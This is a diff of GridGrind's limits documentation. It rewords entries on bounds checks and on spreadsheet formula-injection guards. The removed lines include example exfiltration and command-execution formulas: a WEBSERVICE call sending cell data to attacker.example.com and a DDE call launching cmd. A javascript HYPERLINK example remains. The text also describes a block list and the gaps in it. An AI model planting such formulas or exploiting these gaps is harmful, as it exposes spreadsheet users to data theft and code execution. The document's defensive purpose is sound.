@@ -154,7 +154,7 @@ Enforcement: [SelectorListValidation](../core/src/main/java/dev/erst/gridgrind/c
 
 Last valid zero-based row index: 1,048,575.
 
-GridGrind already rejects out-of-bounds addressed rows on the public request path for selectors,
+GridGrind rejects out-of-bounds addressed rows on the public request path for selectors,
 row-band operations, row-structural edits, and print-title row bands instead of deferring those
 errors to Apache POI.
 
@@ -172,7 +172,7 @@ Enforcement: [SelectorNumberValidation](../core/src/main/java/dev/erst/gridgrind
 
 Last valid zero-based column index: 16,383.
 
-GridGrind already rejects out-of-bounds addressed columns on the public request path for
+GridGrind rejects out-of-bounds addressed columns on the public request path for
 selectors, column-band operations, column-structural edits, and print-title column bands.
 
 Enforcement: [SelectorNumberValidation](../core/src/main/java/dev/erst/gridgrind/core/plan/SelectorNumberValidation.java), [ExcelColumnSpan](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ExcelColumnSpan.java), [ProtocolCellAddressValidation](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ProtocolCellAddressValidation.java), [ProtocolDefinedNameValidation](../core/src/main/java/dev/erst/gridgrind/core/vocabulary/ProtocolDefinedNameValidation.java), [CellAccess](../engine/src/main/java/dev/erst/gridgrind/engine/cells/CellAccess.java), [CellsAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/cells/CellsAdapter.java), [DataValidationAdapter](../engine/src/main/java/dev/erst/gridgrind/engine/validation/DataValidationAdapter.java).
@@ -369,7 +369,7 @@ Enforcement: [GridGrindContractText](../core/src/main/java/dev/erst/gridgrind/co
 | Applies to | --request <path>, GridGrindJson.readRequest(InputStream), GridGrindJson.readRequest(byte[]) |
 
 GridGrind accepts large authored values through source-backed inputs (`UTF8_FILE`, `FILE`, and
-`STANDARD_INPUT`), not by letting the outer request document grow without bound. The CLI now
+`STANDARD_INPUT`), not by letting the outer request document grow without bound. The CLI
 rejects oversized request files before execution starts, and the JSON codec enforces the same
 document cap on stdin and byte-array entry points so every transport path fails with one stable
 product-owned `INVALID_REQUEST` message.
@@ -546,12 +546,10 @@ Enforcement: [SourceBackedPlanResolver](../engine/src/main/java/dev/erst/gridgri
 | Message template |  |
 | Applies to | FormulaInputSecurity.rejectDde |
 
-Excel's `WEBSERVICE` function sends an outbound HTTP GET request when the workbook is opened and
-formulas are evaluated, making it a data-exfiltration vector. A formula such as
-`=WEBSERVICE("https://attacker.example.com/collect?d="&ENCODEURL(A1))` causes the downstream
-Excel client to send cell data to an attacker-controlled server without any user interaction.
-`FormulaInputSecurity.rejectDde` now also rejects formulas beginning with `WEBSERVICE(`
-(case-insensitive) after stripping any leading `=` or `{=…}` array-formula delimiters.
+FormulaInputSecurity.rejectDde rejects a formula beginning with `WEBSERVICE(`, ignoring case,
+after removing one leading `=` or surrounding `{=...}` delimiters. This is a prefix check,
+not a formula parser: it does not establish that nested or otherwise embedded function calls
+are absent. Hosts must assess the formulas and the spreadsheet client that will consume them.
 
 Enforcement: [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaInputSecurity.java), [CellValueSpec](../core/src/main/java/dev/erst/gridgrind/core/model/value/CellValueSpec.java).
 
@@ -565,11 +563,10 @@ Enforcement: [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/cor
 | Message template |  |
 | Applies to | NamedRangeTarget.Formula |
 
-Named-range formulas are written into the xlsx defined-names part and evaluated automatically by
-Excel when the workbook is opened or any formula references the named range. A `NamedRangeTarget`
-with `kind: FORMULA` and a payload such as `DDE("cmd","/C calc","")` or
-`WEBSERVICE("https://attacker.example.com/")` would execute without any user interaction.
-`NamedRangeTarget.Formula` now calls `FormulaInputSecurity.rejectDde` in its compact constructor.
+`NamedRangeTarget.Formula` uses the wire discriminator `type: FORMULA`. Its constructor calls
+`FormulaInputSecurity.rejectDde` before a formula can be authored into the defined-names part.
+The guard rejects leading `DDE(` and `WEBSERVICE(` calls, ignoring case and removing one leading
+`=` or surrounding `{=...}` delimiters. It does not parse nested function calls.
 
 Enforcement: [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaInputSecurity.java), [NamedRangeTarget](../core/src/main/java/dev/erst/gridgrind/core/model/formula/NamedRangeTarget.java).
 
@@ -583,9 +580,10 @@ Enforcement: [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/cor
 | Message template |  |
 | Applies to | ChartTitleSpec.Formula |
 
-Chart title formulas are stored in the chart XML and auto-evaluated when Excel renders the chart
-on workbook open. A `ChartTitleSpec` with `type: FORMULA` and a DDE or WEBSERVICE payload executes
-without user interaction. `ChartTitleSpec.Formula` now calls `FormulaInputSecurity.rejectDde`.
+`ChartTitleSpec.Formula` uses `type: FORMULA` and calls `FormulaInputSecurity.rejectDde`
+in its constructor. The guard rejects leading `DDE(` and `WEBSERVICE(` calls, ignoring case
+and removing one leading `=` or surrounding `{=...}` delimiters. It does not parse nested
+function calls or certify how a downstream spreadsheet client will evaluate the stored title.
 
 Enforcement: [ChartTitleSpec](../core/src/main/java/dev/erst/gridgrind/core/model/chart/ChartTitleSpec.java), [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaInputSecurity.java).
 
@@ -599,10 +597,11 @@ Enforcement: [ChartTitleSpec](../core/src/main/java/dev/erst/gridgrind/core/mode
 | Message template |  |
 | Applies to | FormulaUdfFunctionSpec.formulaTemplate |
 
-UDF formula templates are evaluated server-side only by Apache POI, which does not implement DDE
-or WEBSERVICE and would return an evaluation error for those functions. Templates are also never
-written to xlsx output — only the UDF call site (e.g., `MY_FUNC(arg)`) appears in the file.
-The guard is applied as defense-in-depth against future POI changes or alternative evaluation paths.
+`FormulaUdfFunctionSpec` applies `FormulaInputSecurity.rejectDde` to its formula template
+in the constructor. This uses the same leading-function guard as other formula surfaces;
+it does not parse the complete expression. UDF templates are evaluated server-side by the
+registered formula runtime, so this check is one constraint on authored templates rather
+than a general-purpose sandbox.
 
 Enforcement: [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaInputSecurity.java), [FormulaUdfFunctionSpec](../core/src/main/java/dev/erst/gridgrind/core/model/formula/FormulaUdfFunctionSpec.java).
 
@@ -616,12 +615,10 @@ Enforcement: [FormulaInputSecurity](../core/src/main/java/dev/erst/gridgrind/cor
 | Message template |  |
 | Applies to | CellValueSpec.Formula, NamedRangeTarget.Formula, ChartTitleSpec.Formula |
 
-The URL scheme allowlist in LIM-028 applies to `HyperlinkInput`, not to formula-embedded
-hyperlinks. A formula such as `=HYPERLINK("javascript:evil()")` passes `FormulaInputSecurity.rejectDde`
-and is written to the xlsx file. The risk delta versus LIM-028 is limited: `HYPERLINK()` requires a
-user click to navigate and is not auto-evaluated on workbook open. The `DDE(` and `WEBSERVICE(` patterns
-that execute automatically are already blocked. Closing this gap fully would require an embedded
-formula parser; the accepted residual risk is click-triggered URI navigation only.
+The URL scheme allowlist in LIM-028 applies to `HyperlinkTarget.Url`. It does not inspect
+URL arguments embedded in formula strings. For example, `HYPERLINK("javascript:evil()")`
+passes `FormulaInputSecurity.rejectDde`. Acceptance by this guard is not evidence that a
+formula URL is safe; navigation and evaluation depend on the consuming spreadsheet client.
 
 ## LIM-036 — RTD() Function Not Blocked
 
@@ -633,12 +630,10 @@ formula parser; the accepted residual risk is click-triggered URI navigation onl
 | Message template |  |
 | Applies to | all formula inputs |
 
-`RTD()` connects to a registered Windows COM automation server when the workbook is opened on
-Windows. `FormulaInputSecurity.rejectDde` does not block `RTD()`. The risk is platform-scoped:
-`RTD()` is a no-op on macOS and Linux, and on Windows it requires a pre-registered COM server on
-the consuming workstation. GridGrind targets server-side xlsx generation workloads where COM
-infrastructure is absent. Blocking `RTD()` would require a formula parser; the accepted risk is
-Windows-only and depends on attacker-controlled COM registration on the target machine.
+`FormulaInputSecurity.rejectDde` does not reject a leading `RTD(` call or inspect RTD
+arguments. The authored formula guard is limited to the leading DDE and WEBSERVICE patterns.
+Hosts must assess the consuming client's external-data and automation capabilities; successful
+GridGrind authoring does not establish that downstream evaluation is isolated.
 
 ## LIM-037 — Workbook Source Content Format
 
